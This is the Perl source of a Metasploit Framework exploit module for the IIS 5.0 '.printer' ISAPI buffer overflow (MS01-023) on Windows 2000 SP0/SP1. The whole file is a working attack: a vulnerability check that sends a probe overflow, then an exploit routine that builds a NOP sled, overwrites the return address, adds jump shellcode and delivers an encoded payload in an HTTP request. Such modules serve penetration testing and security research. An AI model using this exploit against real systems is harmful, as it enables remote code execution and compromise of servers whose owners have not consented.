package Msf::Exploit::iis50_printer_overflow;
use base "Msf::Exploit";
use strict;

my $advanced = { };

my $info =
{

    'Name'  => 'IIS 5.0 Printer Buffer Overflow',
    'Version'  => '$Revision: 1.18 $',
    'Authors' => [ 'H D Moore <hdm [at] metasploit.com> [Artistic License]', ],
    'Arch'  => [ 'x86' ],
    'OS'    => [ 'win32' ],
    'Priv'  => 0,
    'UserOpts'  => {
                    'RHOST' => [1, 'ADDR', 'The target address'],
                    'RPORT' => [1, 'PORT', 'The target port', 80],
                    'SSL'   => [0, 'BOOL', 'Use SSL'],
                },

    'Payload' => {
                 'Space'  => 900,
                 'BadChars'  => "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c",
                 },
    
    'Description'  => qq{
        This exploits a buffer overflow in the request processor of
        the Internet Printing Protocol ISAPI module in IIS. This
        module works against Windows 2000 service pack 0 and 1. If
        the service stops responding after a successful compromise,
        run the exploit a couple more times to completely kill the
        hung process.
    },
  
    'Refs'  =>  [
                    'http://www.osvdb.org/548',
                    'http://www.microsoft.com/technet/security/bulletin/MS01-023.mspx',
                    'http://lists.insecure.org/lists/bugtraq/2001/May/0011.html',
                ],
    'DefaultTarget' => 0,
    'Targets' => [['Windows 2000 SP0/SP1', 0x732c45f3]],
};

sub new {
  my $class = shift;
  my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
  return($self);
}

sub Check {
    my $self = shift;
    my $target_host = $self->GetVar('RHOST');
    my $target_port = $self->GetVar('RPORT');
    my $s = Msf::Socket->new( {"SSL" => $self->GetVar("SSL")} );
 
 
    # First check to see if the IPP filter is installed
    if (! $s->Tcp($target_host, $target_port)) {
        $self->PrintLine("[*] Could not connect: " . $s->GetError());
        return(0);
    }
    
    $s->Send("GET /NULL.printer\r\n\r\n");
    my $res = $s->Recv(-1, 5);
    $s->Close();
    
    if ($res !~ /Error in web printer/) {
        $self->PrintLine("[*] Server may not have the .printer extension mapped");
        return(0);
    }
    
    # Now send a mini-overflow to see if the service is vulnerable
    if (! $s->Tcp($target_host, $target_port)) {
        $self->PrintLine("[*] Could not connect: " . $s->GetError());
        return(0);
    }
    
    $s->Send("GET /NULL.printer\r\nHost: " . ("META" x 64) . "P\r\n\r\n");
    $res = $s->Recv(-1, 5);
    $s->Close();
    
    if ($res =~ /locked out/) {
        $self->PrintLine("[*] The IUSR account is locked account, we can't check");
        return(0);
    } 
    elsif ($res =~ /HTTP\/1\.1 500/) {
        $self->PrintLine("[*] The system appears to be vulnerable");
        return(1);
    }
    
    $self->PrintLine("[*] The system does not appear to be vulnerable");
    return(0);
}



sub Exploit 
{
    my $self = shift;
    my $target_host = $self->GetVar('RHOST');
    my $target_port = $self->GetVar('RPORT');
    my $target_idx  = $self->GetVar('TARGET');
    my $shellcode   =$self->GetVar('EncodedPayload')->Payload;
   
    my $target = $self->Targets->[$target_idx];

    my $pattern = ("\x90" x 280);
    substr($pattern, 268, 4, pack("V", $target->[1]));

    # payload is at: [ebx + 96] + 256 + 64
    $pattern .= "\x8b\x4b\x60";         # mov ecx, [ebx + 96]
    $pattern .= "\x80\xc1\x40";         # add cl, 64
    $pattern .= "\x80\xc5\x01";         # add ch, 1
    $pattern .= "\x89\xe5";             # mov ebp, esp (not necessary)
    $pattern .= "\xff\xe1";             # jmp ecx

    my $request = "GET http://$pattern/null.printer?$shellcode HTTP/1.0\r\n\r\n";

    $self->PrintLine(sprintf ("[*] Trying ".$target->[0]." using return to esp at 0x%.8x...", $target->[1]));

    my $s = Msf::Socket->new({"SSL" => $self->GetVar("SSL")});
    if (! $s->Tcp($target_host, $target_port)) {
        $self->PrintLine("[*] Error: " . $s->GetError());
        return;
    }

    $s->Send($request);
    sleep(2);
    $s->Close();
    return;
}


